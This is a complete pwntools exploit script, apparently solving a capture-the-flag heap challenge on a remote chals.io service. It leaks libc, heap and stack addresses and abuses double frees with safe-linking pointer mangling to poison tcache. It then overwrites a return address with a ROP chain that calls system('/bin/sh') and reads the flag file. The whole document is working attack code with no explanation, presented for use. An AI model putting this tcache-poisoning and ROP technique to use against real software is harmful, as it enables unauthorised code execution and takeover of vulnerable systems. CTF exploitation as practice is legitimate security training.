from pwn import *

mangle = lambda ptr, pos: ptr ^ (pos >> 12)

libc = ELF("./libc.so.6")
context.arch = "amd64"

r = remote("0.cloud.chals.io", 30988)

def deploy(idx):
    r.sendlineafter(b"selection >>>", b"1")
    r.sendlineafter(b">>>", str(idx).encode())

def load(idx, fmt=b"A"):
    r.sendlineafter(b"selection >>>", b"2")
    r.sendlineafter(b">>>", str(idx).encode())
    r.sendafter(b">>>", fmt)

def free(idx):
    r.sendlineafter(b"selection >>>", b"3")
    r.sendlineafter(b">>>", str(idx).encode())

load(1, b"Alien")
deploy(1)
r.recvuntil(b"coordinate: 0x")
libc.address = int(r.recvline().strip(), 16)-libc.sym.printf
log.info(f"{hex(libc.address)=}")
load(2)
free(2)
free(2)
free(1)
free(4)
free(5)
free(6)
deploy(2)
r.recvuntil(b"compartment 2: ")
heap = u64(r.recvline().strip().ljust(8, b"\x00"))<<12
log.info(f"{hex(heap)=}")
free(3)
free(3)
load(3, p64(mangle(libc.sym.environ-24, heap)))
load(4)
load(5, b"A"*24)
deploy(5)
r.recvuntil(b"The "+b"A"*24)
stack = u64(r.recvuntil(b" ").strip().ljust(8, b"\x00"))
log.info(f"{hex(stack)=}")
free(3)
free(3)
load(3, p64(mangle(stack-0x138, heap)))
load(1)
rop1 = ROP(libc)
rop1.system(next(libc.search(b"/bin/sh")))
load(6, b"aplet123"+p64(libc.address+0x584db)+rop1.chain())
r.sendlineafter(b"selection >>>", b"9")
r.sendlineafter(b"selection >>>", b"9")
r.sendlineafter(b"selection >>>", b"9")
r.sendline(b"ccat flag.txt")
r.interactive()